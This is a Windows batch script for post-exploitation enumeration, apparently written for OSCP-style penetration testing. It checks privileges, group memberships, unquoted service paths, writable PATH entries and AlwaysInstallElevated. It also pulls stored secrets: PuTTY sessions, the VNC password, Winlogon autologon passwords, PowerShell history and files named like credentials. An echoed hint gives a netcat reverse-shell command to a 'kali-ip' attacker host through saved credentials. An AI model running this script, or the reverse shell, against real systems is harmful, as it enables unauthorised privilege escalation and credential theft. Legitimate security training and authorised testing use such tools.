@echo off
setlocal enabledelayedexpansion

:: Get ESC character for ANSI colors
for /f %%a in ('echo prompt $E ^| cmd') do set "ESC=%%a"

:: Color definitions (with ESC prefix - fixed)
set "RED=%ESC%[91m"
set "GREEN=%ESC%[92m"
set "YELLOW=%ESC%[93m"
set "BLUE=%ESC%[94m"
set "MAGENTA=%ESC%[95m"
set "CYAN=%ESC%[96m"
set "WHITE=%ESC%[97m"
set "RESET=%ESC%[0m"
set "BOLD=%ESC%[1m"

:: Hide cursor
<nul set /p "=%ESC%[?25l"

echo %BOLD%%GREEN% ===Local Enumeration Script===
echo       Author: Muharram Ali
echo       Email: ali.oscp@proton.me
echo       Version: 2025.2
echo.
echo [*] Starting System Enumeration%RESET%
echo.

echo %BOLD%%BLUE%**** Basic System Identification ******************************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"%RESET%
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%hostname%RESET%
hostname
echo.

echo %YELLOW%[Command]%RESET% %GREEN%net accounts%RESET%
echo %YELLOW% Password policy and account lockout info%RESET%
net accounts
echo.

echo %BOLD%%BLUE%**** Current User Information *********************************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%whoami /user%RESET%
whoami /user & whoami /priv
echo.

echo %YELLOW%[Command]%RESET% %GREEN%net user "%USERNAME%"%RESET%
echo %YELLOW% Current user properties. check for logon scripts etc%RESET%
net user "%USERNAME%"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%whoami /groups%RESET%
echo %YELLOW% Current user belongs to the below local groups%RESET%
whoami /groups
echo.

echo %YELLOW%[Command]%RESET% %GREEN%whoami /groups | findstr /i "share"%RESET%
whoami /groups | findstr /i "share"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%query user%RESET%
query user
echo.

echo %BOLD%%BLUE%**** User and Group Information ******************************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%net user%RESET%
net user
echo.

echo %YELLOW%[Command]%RESET% %GREEN%net localgroup%RESET%
net localgroup
echo.

echo %YELLOW%[Command]%RESET% %GREEN%net localgroup administrators%RESET%
net localgroup administrators
echo.

echo %YELLOW%[Command]%RESET% %GREEN%cmdkey /list%RESET%
cmdkey /list
echo.

echo %BOLD%%BLUE%****if cmdkey is listed, you can run commands based on the user permission. see below example.%RESET%
echo %BOLD%%BLUE%****runas /savecred /user:Administrator "nc.exe -nv kali-ip 4445 -e cmd.exe" or Powershell from nishang.%RESET%
echo.

echo %YELLOW%[Command]%RESET% %GREEN%net user /domain%RESET%
net user /domain 2>nul | findstr /v "The request will be processed at a domain controller"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%net group /domain%RESET%
net group /domain 2>nul | findstr /v "The request will be processed at a domain controller"
echo.

echo %BOLD%%BLUE%**** Privilege Checks ************************************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%Checking SeImpersonatePrivilege%RESET%
whoami /priv | findstr "SeImpersonatePrivilege"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking SeDebugPrivilege%RESET%
whoami /priv | findstr "SeDebugPrivilege"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking SeTakeOwnershipPrivilege%RESET%
whoami /priv | findstr "SeTakeOwnershipPrivilege"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking SeManageVolumePrivilege%RESET%
whoami /priv | findstr "SeManageVolumePrivilege"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking SeRestorePrivilege%RESET%
whoami /priv | findstr "SeRestorePrivilege"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking SeBackupPrivilege%RESET%
whoami /priv | findstr "SeBackupPrivilege"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking SeLoadDriverPrivilege%RESET%
whoami /priv | findstr "SeLoadDriverPrivilege"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking for local service account%RESET%
whoami | findstr "local service"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking for service accounts%RESET%
whoami | findstr "svc"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking Backup Operators membership%RESET%
whoami /groups | findstr "Backup Operators"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking DnsAdmins membership%RESET%
whoami /groups | findstr "DnsAdmins"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking Print Operators membership%RESET%
whoami /groups | findstr "Print Operators"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking Server Operators membership%RESET%
whoami /groups | findstr "Server Operators"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking GPO Admins membership%RESET%
whoami /groups | findstr "GPO Admins"
echo.

echo %BOLD%%BLUE%**** Running Processes as NT AUTHORITY SYSTEM ************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%tasklist /v /fi "username eq system"%RESET%
tasklist /v /fi "username eq system"
echo.

echo %BOLD%%BLUE%**** Local Network Shares ********************************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%net share%RESET%
net share
echo.

echo %YELLOW%[Command]%RESET% %GREEN%net view \\127.0.0.1%RESET%
net view \\127.0.0.1 >nul 2>&1 && net view \\127.0.0.1
echo.

echo %BOLD%%BLUE%**** Network Connections *********************************************************************************%RESET%
echo %BOLD%%BLUE%****If locally accessable then you need port forwarding****%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%netstat -ano | findstr "127.0.0.1" |findstr "LISTENING"%RESET%
netstat -ano | findstr "127.0.0.1" |findstr "LISTENING"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%netstat -ano | findstr ESTABLISHED%RESET%
netstat -ano | findstr ESTABLISHED
echo.

echo %BOLD%%BLUE%**** Drives and Volumes **********************************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%powershell -c "Get-PSDrive -PSProvider FileSystem | Select-Object Name,Root,Used,Free"%RESET%
powershell -c "Get-PSDrive -PSProvider FileSystem | Select-Object Name,Root,Used,Free | Format-Table -AutoSize"
echo.

echo %BOLD%%BLUE%**** Installed Software (Non-Microsoft) ******************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%powershell Win32_Product - installed software%RESET%
powershell -c "Get-WmiObject -Class Win32_Product | Select-Object Name,Version,Vendor | Format-Table -AutoSize" 2>nul
echo.

echo %YELLOW%[Command]%RESET% %GREEN%powershell - HKLM SOFTWARE registry%RESET%
powershell -c "Get-ChildItem -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE' | ft Name"
echo.

echo %BOLD%%BLUE%**** Program Files Enumeration ***************************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%dir "C:\"%RESET%
dir "C:\" /a:d 2>nul | findstr /V /I /C:"Windows" /C:"Users" /C:"PerfLogs" /C:"Program Files" /C:"Volume" /C:"Directory" /C:"bytes"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%dir "C:\Program Files (x86)"%RESET%
dir "C:\Program Files (x86)" 2>nul | findstr /V /I /C:"Microsoft" /C:"Windows" /C:"Common Files" /C:"Internet Explorer" /C:"Directory of" /C:"Volume" /C:"bytes" /C:"<DIR>"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%dir "C:\Program Files"%RESET%
dir "C:\Program Files" 2>nul | findstr /V /I /C:"Microsoft" /C:"Windows" /C:"Common Files" /C:"Internet Explorer" /C:"ModifiableWindowsApps" /C:"PowerShell" /C:"RSAT" /C:"Directory of" /C:"Volume" /C:"bytes" /C:"<DIR>"
echo.

echo %BOLD%%BLUE%**** Unquoted Service Paths ******************************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%wmic service get name,displayname,pathname,startmode - unquoted paths%RESET%
echo %YELLOW% Look for paths with spaces not wrapped in quotes - common privesc vector%RESET%
wmic service get name,displayname,pathname,startmode 2>nul | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
echo.

echo %YELLOW%[Command]%RESET% %GREEN%powershell - service paths and start accounts%RESET%
powershell -c "Get-WmiObject win32_service | Select-Object Name,StartName,PathName | Format-Table -AutoSize" 2>nul
echo.

echo %BOLD%%BLUE%**** Writable Directories in System PATH *****************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%Checking PATH entries for write permissions - DLL hijacking vector%RESET%
for %%p in (%PATH%) do (
    icacls "%%p" 2>nul | findstr /i "(F) (M) (W) :\" >nul 2>&1 && echo [WRITABLE] %%p
)
echo.

echo %BOLD%%BLUE%**** Scheduled Tasks (Non-Microsoft) ********************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%schtasks /query /fo LIST%RESET%
schtasks /query /fo LIST 2>nul | findstr TaskName | findstr /v /i Microsoft
echo.

echo %YELLOW%[Command]%RESET% %GREEN%powershell Get-ScheduledTask non-Microsoft%RESET%
powershell -c "Get-ScheduledTask | where {$_.TaskPath -notlike '*Microsoft*'} | ft TaskName,TaskPath,State"
echo.

echo %BOLD%%BLUE%**** Startup Programs *********************************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%powershell Win32_StartupCommand%RESET%
powershell -c "Get-CimInstance Win32_StartupCommand | select Name,Command,Location,User | fl"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%AutoRun Registry Keys%RESET%
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 2>nul
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 2>nul
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" 2>nul
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" 2>nul
echo.

echo %BOLD%%BLUE%**** Registry Enumeration ******************************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%reg query PuTTY Sessions%RESET%
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" 2>nul | findstr /v /i "ERROR"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%reg query RealVNC password%RESET%
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password 2>nul | findstr /v /i "ERROR"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%reg query WDigest UseLogonCredential%RESET%
reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential 2>nul | findstr /v /i "ERROR"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%reg query Winlogon CACHEDLOGONSCOUNT%RESET%
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v CACHEDLOGONSCOUNT 2>nul | findstr /v /i "ERROR"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%reg query Winlogon AutoLogon credentials%RESET%
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername 2>nul | findstr /v /i "ERROR"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword 2>nul | findstr /v /i "ERROR"
echo.

echo %BOLD%%BLUE%**** AlwaysInstallElevated Checks ***********************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%reg query HKCU AlwaysInstallElevated%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%If found 0x1 then get shell with .msi payload%RESET%
reg query "HKCU\Software\Policies\Microsoft\Windows\Installer" 2>nul | findstr /v /i "ERROR"
reg query "HKCU\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated 2>nul | findstr /v /i "ERROR"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%reg query HKLM AlwaysInstallElevated%RESET%
reg query "HKLM\Software\Policies\Microsoft\Windows\Installer" 2>nul | findstr /v /i "ERROR"
reg query "HKLM\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated 2>nul | findstr /v /i "ERROR"
echo.

echo %BOLD%%BLUE%**** Sensitive File Search ******************************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%Searching for files with sensitive names in user profile%RESET%
dir /s /b "%USERPROFILE%\*.txt" 2>nul | findstr /i "pass cred secret key token"
dir /s /b "%USERPROFILE%\*.xml" 2>nul | findstr /i "pass cred secret key token"
dir /s /b "%USERPROFILE%\*.ini" 2>nul | findstr /i "pass cred secret key token"
dir /s /b "%USERPROFILE%\*.config" 2>nul | findstr /i "pass cred secret key token"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%PowerShell command history%RESET%
type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>nul
echo.

echo %BOLD%%RED%+++++++++++Search Recyclebins +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%powershell - user accounts and SIDs%RESET%
echo %YELLOW% And then check dir C:\$Recycle.Bin\SID%RESET%
powershell -c "Get-WmiObject Win32_UserAccount | Select-Object Name,SID | Format-Table -AutoSize" 2>nul
echo.

echo %BOLD%%GREEN%[*] Enumeration Complete%RESET%

:: Restore cursor
<nul set /p "=%ESC%[?25h"
endlocal
